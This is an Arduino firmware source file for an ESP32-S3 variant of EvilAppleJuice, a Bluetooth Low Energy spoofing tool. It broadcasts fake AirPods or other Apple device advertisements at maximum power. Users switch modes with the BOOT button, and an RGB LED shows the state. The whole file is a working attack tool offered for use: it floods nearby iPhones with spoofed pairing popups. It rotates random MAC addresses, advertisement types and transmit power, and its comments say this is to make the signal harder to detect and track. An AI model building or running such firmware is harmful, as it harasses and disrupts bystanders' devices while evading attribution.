// EvilAppleJuice ESP32-S3 个性化版本
// 按键: 短按 BOOT = 切换模式(1=AirPods / 2=随机); 长按 BOOT(1s) = 电源开关
// 灯光: 关闭=灭; AirPods模式=红光闪烁; 随机模式=随机变色闪烁
// Based on ckcr4lyf/EvilAppleJuice-ESP32
#include <Arduino.h>

#include <BLEDevice.h>
#include <BLEUtils.h>
#include <BLEServer.h>
#include <Preferences.h>

#include <esp_arduino_version.h>

#include "devices.hpp"
#include "rgb.hpp"

// Bluetooth maximum transmit power
#if defined(CONFIG_IDF_TARGET_ESP32C3) || defined(CONFIG_IDF_TARGET_ESP32C2) || defined(CONFIG_IDF_TARGET_ESP32S3)
#define MAX_TX_POWER ESP_PWR_LVL_P21  // ESP32C3 ESP32C2 ESP32S3
#elif defined(CONFIG_IDF_TARGET_ESP32H2) || defined(CONFIG_IDF_TARGET_ESP32C6)
#define MAX_TX_POWER ESP_PWR_LVL_P20  // ESP32H2 ESP32C6
#else
#define MAX_TX_POWER ESP_PWR_LVL_P9   // Default
#endif

BLEAdvertising *pAdvertising;  // global variable
uint32_t delayMilliseconds = 100;

// ---- 控制状态 ----
bool deviceEnabled = true;  // 总开关（默认开）
int currentMode = 1;        // 1 = AirPods(固定), 2 = Random(随机)
Preferences preferences;

// ESP32-S3 板载 BOOT 按键 = GPIO0（按下为低电平）
// 注意: 复位/上电瞬间按住 GPIO0 会进入下载模式；运行中按键则控制本固件
const int BOOT_BUTTON_PIN = 0;
const unsigned long LONG_PRESS_TIME = 1000; // 长按阈值 1 秒

void saveState() {
  preferences.begin("my-app", false);
  preferences.putBool("enabled", deviceEnabled);
  preferences.putInt("mode", currentMode);
  preferences.end();
}

void toggleEnabled() {
  deviceEnabled = !deviceEnabled;
  Serial.printf("Power %s\n", deviceEnabled ? "ON" : "OFF");
  saveState();
}

void switchMode() {
  currentMode = (currentMode == 1) ? 2 : 1;
  Serial.printf("Mode: %d (%s)\n", currentMode, currentMode == 1 ? "AirPods" : "Random");
  saveState();
}

void setup() {
  Serial.begin(115200);
  Serial.println("Starting ESP32 BLE");

  // 读取上次状态: 开关 + 模式（默认 开 / AirPods）
  preferences.begin("my-app", false);
  deviceEnabled = preferences.getBool("enabled", true);
  currentMode = preferences.getInt("mode", 1);
  if (currentMode < 1 || currentMode > 2) currentMode = 1;
  preferences.end();
  Serial.printf("Power: %s, Mode: %d\n", deviceEnabled ? "ON" : "OFF", currentMode);

  pinMode(BOOT_BUTTON_PIN, INPUT_PULLUP);

  // 板载 RGB (WS2812 @ GPIO48)
  initRgb();
  rgbOff();

  BLEDevice::init("AirPods 69");

  // Increase the BLE Power to 21dBm (MAX)
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);

  // Create the BLE Server
  BLEServer *pServer = BLEDevice::createServer();
  pAdvertising = pServer->getAdvertising();

  // seems we need to init it with an address in setup() step.
  esp_bd_addr_t null_addr = {0xFE, 0xED, 0xC0, 0xFF, 0xEE, 0x69};
  pAdvertising->setDeviceAddress(null_addr, BLE_ADDR_TYPE_RANDOM);
}

void setAdvertisementData(BLEAdvertisementData &oAdvertisementData, const AppleDevice& dev) {
  uint8_t packet[31];
  size_t packetLen;
  generatePacket(dev, packet, packetLen);
  Serial.printf("Broadcasting %s (Length: %d)...\n", dev.name, packetLen);

  #ifdef ESP_ARDUINO_VERSION_MAJOR
    #if ESP_ARDUINO_VERSION >= ESP_ARDUINO_VERSION_VAL(3, 0, 0)
        oAdvertisementData.addData(String((char*)packet, packetLen));
    #else
        oAdvertisementData.addData(std::string((char*)packet, packetLen));
    #endif
  #endif
}

void setRandomDeviceData(BLEAdvertisementData &oAdvertisementData) {
  // Randomly pick data from one of the devices
  int idx = random(0, sizeof(ALL_DEVICES) / sizeof(ALL_DEVICES[0]));
  AppleDevice dev = ALL_DEVICES[idx];
  setAdvertisementData(oAdvertisementData, dev);
}

// ---- 灯光: 按开关+模式刷新 RGB ----
void updateLed() {
  if (!deviceEnabled) {
    rgbOff();
    return;
  }
  if (currentMode == 1) {
    // AirPods 模式: 红光闪烁 (600ms 周期)
    if ((millis() % 600) < 300) setRgb(255, 0, 0);
    else rgbOff();
  } else {
    // 随机模式: 随机变色闪烁 (亮 250ms / 灭 250ms, 每次亮起换随机色)
    static unsigned long nextHueChange = 0;
    static uint16_t hue = 0;
    if (millis() >= nextHueChange) {
      hue = random(360);
      nextHueChange = millis() + 500;
    }
    if ((millis() % 500) < 250) setRgbHsv(hue);
    else rgbOff();
  }
}

// ---- 按键: 非阻塞状态机 (短按切模式 / 长按1s开关) ----
void handleButton() {
  static unsigned long pressStart = 0;
  static bool pressActive = false;
  static bool longHandled = false;

  bool pressed = (digitalRead(BOOT_BUTTON_PIN) == LOW);
  unsigned long now = millis();

  if (pressed && !pressActive) {
    pressActive = true;
    pressStart = now;
    longHandled = false;
  } else if (pressed && pressActive) {
    if (!longHandled && (now - pressStart) >= LONG_PRESS_TIME) {
      Serial.println("BOOT long press -> toggle power");
      toggleEnabled();
      longHandled = true;  // 长按已触发，松开时不再判为短按
    }
  } else if (!pressed && pressActive) {
    if (!longHandled) {
      Serial.println("BOOT short press -> switch mode");
      switchMode();
    }
    pressActive = false;
  }
}

void loop() {
  handleButton();

  // 电源关闭: 停止广播、灯灭
  if (!deviceEnabled) {
    pAdvertising->stop();
    rgbOff();
    delay(delayMilliseconds);
    return;
  }

  // First generate fake random MAC
  esp_bd_addr_t dummy_addr = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
  for (int i = 0; i < 6; i++){
    dummy_addr[i] = random(256);

    // It seems for some reason first 4 bits
    // Need to be high (aka 0b1111), so we 
    // OR with 0xF0
    if (i == 0){
      dummy_addr[i] |= 0xF0;
    }
  }

  BLEAdvertisementData oAdvertisementData = BLEAdvertisementData();

  // 模式 1: 固定 AirPods（最轰炸）；模式 2: 随机设备
  if (currentMode == 1) {
    setAdvertisementData(oAdvertisementData, ALL_DEVICES[AIRPODS]);
  } else {
    setRandomDeviceData(oAdvertisementData);
  }

  /*  Page 191 of Apple's "Accessory Design Guidelines for Apple Devices (Release R20)" recommends to use only one of
      the three advertising PDU types when you want to connect to Apple devices.
          // 0 = ADV_TYPE_IND, 
          // 1 = ADV_TYPE_SCAN_IND
          // 2 = ADV_TYPE_NONCONN_IND
      
      Randomly using any of these PDU types may increase detectability of spoofed packets. 
  */
  int adv_type_choice = random(3);
  if (adv_type_choice == 0){
    pAdvertising->setAdvertisementType(ADV_TYPE_IND);
  } else if (adv_type_choice == 1){
    pAdvertising->setAdvertisementType(ADV_TYPE_SCAN_IND);
  } else {
    pAdvertising->setAdvertisementType(ADV_TYPE_NONCONN_IND);
  }

  // Set the device address, advertisement data
  pAdvertising->setDeviceAddress(dummy_addr, BLE_ADDR_TYPE_RANDOM);
  pAdvertising->setAdvertisementData(oAdvertisementData);
  
  // Start advertising
  pAdvertising->start();
  delay(delayMilliseconds); // delay for delayMilliseconds ms
  pAdvertising->stop();

  // 刷新模式灯光
  updateLed();

  // Random signal strength increases the difficulty of tracking the signal
  int rand_val = random(100);  // Generate a random number between 0 and 99
  if (rand_val < 70) {  // 70% probability
      esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, MAX_TX_POWER);
  } else if (rand_val < 85) {  // 15% probability
      esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, (esp_power_level_t)(MAX_TX_POWER - 1));
  } else if (rand_val < 95) {  // 10% probability
      esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, (esp_power_level_t)(MAX_TX_POWER - 2));
  } else if (rand_val < 99) {  // 4% probability
      esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, (esp_power_level_t)(MAX_TX_POWER - 3));
  } else {  // 1% probability
      esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, (esp_power_level_t)(MAX_TX_POWER - 4));
  }
}
